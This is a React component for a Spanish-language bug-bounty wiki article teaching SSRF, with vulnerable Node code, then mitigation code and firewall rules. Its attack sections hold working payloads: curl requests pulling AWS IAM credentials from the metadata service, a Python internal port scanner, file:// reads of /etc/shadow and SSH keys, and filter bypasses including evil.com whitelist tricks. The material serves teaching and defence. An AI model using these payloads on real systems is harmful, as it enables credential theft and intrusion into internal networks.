/**
 * SSRF BÁSICO
 * Server-Side Request Forgery - Fundamentos
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Server, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SSRFBasicoContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="¿Qué es SSRF?">
        <Paragraph>
          <Strong>Server-Side Request Forgery (SSRF)</Strong> permite a un atacante hacer que el 
          servidor web realice peticiones HTTP a dominios arbitrarios. Esto es peligroso porque 
          el servidor puede acceder a recursos internos que no están expuestos a Internet.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          Un atacante puede:
          <ul className="mt-2 space-y-1">
            <ListItem>Acceder a servicios internos (AWS metadata, admin panels)</ListItem>
            <ListItem>Escanear red interna (port scanning)</ListItem>
            <ListItem>Leer archivos locales via file:// protocol</ListItem>
            <ListItem>Bypassear firewalls y ACLs</ListItem>
            <ListItem>Robar credenciales de cloud (AWS, GCP, Azure)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="ejemplo-vulnerable" title="1. Código Vulnerable Típico">
        <Subsection title="Fetch de URL desde Input del Usuario">
          <CodeBlock
            language="javascript"
            title="Node.js - Código vulnerable"
            code={`const express = require('express');
const axios = require('axios');

app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  // ❌ VULNERABLE - No valida la URL
  const response = await axios.get(imageUrl);
  res.send(response.data);
});

// Ejemplo de uso legítimo:
// GET /fetch-image?url=https://example.com/logo.png`}
          />
        </Subsection>

        <Subsection title="Exploit - Acceder a Metadata de AWS">
          <CodeBlock
            language="bash"
            title="Payload - Robar credenciales de AWS"
            code={`# AWS EC2 Instance Metadata
curl 'http://vulnerable-app.com/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Respuesta: nombre del IAM role
# "web-server-role"

# Obtener credenciales temporales
curl 'http://vulnerable-app.com/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role'

# Respuesta:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtn...",
  "Token": "IQoJb3JpZ2...",
  "Expiration": "2024-01-15T12:00:00Z"
}`}
          />

          <AlertDanger>
            Con estas credenciales, el atacante puede acceder a S3 buckets, RDS, 
            y otros servicios AWS con los permisos del servidor.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="localhost-bypass" title="2. Acceso a Servicios Internos">
        <Subsection title="Escanear Red Interna">
          <CodeBlock
            language="python"
            title="Script - Port scanner via SSRF"
            code={`import requests
import time

target_url = "http://vulnerable-app.com/fetch-image"

# Lista de puertos comunes
common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

def scan_internal_network():
    # Escanear red 192.168.1.0/24
    for ip in range(1, 255):
        host = f"192.168.1.{ip}"
        
        for port in common_ports:
            url = f"http://{host}:{port}"
            
            try:
                response = requests.get(
                    target_url,
                    params={'url': url},
                    timeout=3
                )
                
                # Si responde, el puerto está abierto
                if response.status_code == 200:
                    print(f"[+] {host}:{port} OPEN")
                    print(f"    Response preview: {response.text[:100]}")
                    
            except requests.Timeout:
                pass  # Puerto cerrado o filtrado
            
            time.sleep(0.1)  # Rate limiting

scan_internal_network()`}
          />
        </Subsection>

        <Subsection title="Acceder a Admin Panel Interno">
          <CodeBlock
            language="bash"
            title="Payload - Admin panel solo accesible desde localhost"
            code={`# Muchas apps tienen admin panels en localhost:8080
curl 'http://vulnerable-app.com/fetch-image?url=http://localhost:8080/admin'

# Alternativas para bypass de filtros:
http://127.0.0.1:8080/admin
http://0.0.0.0:8080/admin
http://[::1]:8080/admin
http://localhost.localdomain:8080/admin`}
          />
        </Subsection>
      </Section>

      <Section id="file-protocol" title="3. File Protocol - Leer Archivos Locales">
        <Paragraph>
          Si la librería HTTP permite esquema <InlineCode>file://</InlineCode>, 
          puedes leer archivos del sistema:
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Payloads - Leer archivos sensibles"
          code={`# Linux
curl 'http://vulnerable-app.com/fetch-image?url=file:///etc/passwd'
curl 'http://vulnerable-app.com/fetch-image?url=file:///etc/shadow'
curl 'http://vulnerable-app.com/fetch-image?url=file:///home/ubuntu/.ssh/id_rsa'

# Windows
curl 'http://vulnerable-app.com/fetch-image?url=file:///C:/Windows/System32/drivers/etc/hosts'
curl 'http://vulnerable-app.com/fetch-image?url=file:///C:/Users/Administrator/.ssh/id_rsa'

# Application files
curl 'http://vulnerable-app.com/fetch-image?url=file:///var/www/html/.env'
curl 'http://vulnerable-app.com/fetch-image?url=file:///app/config/database.yml'`}
        />

        <AlertWarning title="Libraries Afectadas">
          <ul className="mt-2 space-y-1">
            <ListItem>✅ Python <InlineCode>urllib</InlineCode> - Permite file://</ListItem>
            <ListItem>✅ PHP <InlineCode>file_get_contents()</InlineCode> - Permite file://</ListItem>
            <ListItem>❌ JavaScript <InlineCode>fetch()</InlineCode> - NO permite file:// (browser only)</ListItem>
            <ListItem>⚠️ Node.js <InlineCode>axios</InlineCode> - Depende de configuración</ListItem>
          </ul>
        </AlertWarning>
      </Section>

      <Section id="cloud-metadata" title="4. Cloud Metadata Endpoints">
        <Subsection title="AWS EC2 Metadata">
          <CodeBlock
            language="bash"
            title="Endpoints útiles de AWS"
            code={`# IAM credentials (más común)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (scripts de inicio)
http://169.254.169.254/latest/user-data

# Hostname y zona
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/placement/availability-zone

# Network info
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4`}
          />

          <AlertInfo title="IMDSv2 Protection">
            AWS implementó IMDSv2 que requiere un token. Para bypassearlo necesitas 
            que la app vulnerable permita enviar headers custom.
          </AlertInfo>
        </Subsection>

        <Subsection title="Google Cloud Metadata">
          <CodeBlock
            language="bash"
            title="GCP Metadata endpoints"
            code={`# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# SSH keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# Requiere header: Metadata-Flavor: Google`}
          />
        </Subsection>

        <Subsection title="Azure Metadata">
          <CodeBlock
            language="bash"
            title="Azure Instance Metadata Service"
            code={`# Access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Instance info
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Requiere header: Metadata: true`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-filtros" title="5. Bypass de Filtros Comunes">
        <Subsection title="Blacklist de localhost">
          <CodeBlock
            language="bash"
            title="Técnicas de bypass"
            code={`# Representaciones alternativas de 127.0.0.1
http://127.1/
http://0.0.0.0/
http://[::1]/
http://127.0.1.1/
http://localhost.localdomain/

# Decimal/Octal/Hexadecimal
http://2130706433/        # Decimal de 127.0.0.1
http://0x7f000001/        # Hexadecimal
http://0177.0.0.1/        # Octal

# URL encoding
http://127.0.0.1 → http://127%2e0%2e0%2e1
http://localhost → http://local%68ost

# DNS rebinding
http://sslip.io/         # Servicio público para DNS tricks
http://vcap.me/          # Resuelve a 127.0.0.1`}
          />
        </Subsection>

        <Subsection title="Bypass de Whitelist de Dominios">
          <CodeBlock
            language="bash"
            title="Técnicas de bypass con @ y #"
            code={`# Si solo permite "allowed-domain.com"
# Usar @ para especificar credenciales (username@host)
http://allowed-domain.com@evil.com/

# Usar # para fragmento
http://allowed-domain.com#@evil.com/

# Open redirect en dominio permitido
http://allowed-domain.com/redirect?url=http://evil.com/

# Subdomain takeover
http://abandoned-subdomain.allowed-domain.com → CNAME apunta a evil.com`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Defensa en Profundidad">
          Implementar TODAS estas medidas, no solo una.
        </AlertDanger>

        <Subsection title="1. Whitelist de Dominios Permitidos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validar dominio"
            code={`const { URL } = require('url');

const ALLOWED_DOMAINS = [
  'cdn.example.com',
  'images.example.com'
];

function isUrlAllowed(urlString) {
  try {
    const url = new URL(urlString);
    
    // Solo HTTPS
    if (url.protocol !== 'https:') {
      return false;
    }
    
    // Verificar dominio en whitelist
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      return false;
    }
    
    return true;
  } catch (e) {
    return false;
  }
}

app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  if (!isUrlAllowed(imageUrl)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  
  const response = await axios.get(imageUrl);
  res.send(response.data);
});`}
          />
        </Subsection>

        <Subsection title="2. Bloquear IPs Privadas">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Resolver DNS y verificar IP"
            code={`const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

async function isPrivateIP(hostname) {
  try {
    const addresses = await dns.resolve4(hostname);
    
    for (const address of addresses) {
      const addr = ipaddr.parse(address);
      
      // Bloquear rangos privados
      if (addr.range() === 'private' ||
          addr.range() === 'loopback' ||
          addr.range() === 'linkLocal' ||
          addr.range() === 'reserved') {
        return true;
      }
      
      // Bloquear metadata de cloud
      if (address.startsWith('169.254.')) {
        return true;
      }
    }
    
    return false;
  } catch (e) {
    return true; // Si no resuelve, bloquear
  }
}

app.get('/fetch-image', async (req, res) => {
  const url = new URL(req.query.url);
  
  if (await isPrivateIP(url.hostname)) {
    return res.status(400).json({ error: 'Private IP not allowed' });
  }
  
  // ... resto del código
});`}
          />
        </Subsection>

        <Subsection title="3. Deshabilitar Redirects y Protocolos Peligrosos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - axios con opciones restrictivas"
            code={`const axios = require('axios');

const safeAxios = axios.create({
  maxRedirects: 0,           // No seguir redirects
  timeout: 5000,             // Timeout corto
  maxContentLength: 5000000, // Max 5MB
});

// Interceptor para verificar protocol
safeAxios.interceptors.request.use(config => {
  const url = new URL(config.url);
  
  // Solo permitir HTTP/HTTPS
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Protocol not allowed');
  }
  
  return config;
});`}
          />
        </Subsection>

        <Subsection title="4. Network Segmentation">
          <CodeBlock
            language="bash"
            title="Configuración de firewall (iptables)"
            code={`# Bloquear acceso del servidor web a metadata
sudo iptables -A OUTPUT -p tcp -d 169.254.169.254 -j REJECT

# Solo permitir salida a IPs públicas específicas
sudo iptables -A OUTPUT -p tcp -d 10.0.0.0/8 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 172.16.0.0/12 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 192.168.0.0/16 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 127.0.0.0/8 -j REJECT`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SSRF a RCE</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/ssrf-to-rce`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>De SSRF a Remote Code Execution</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
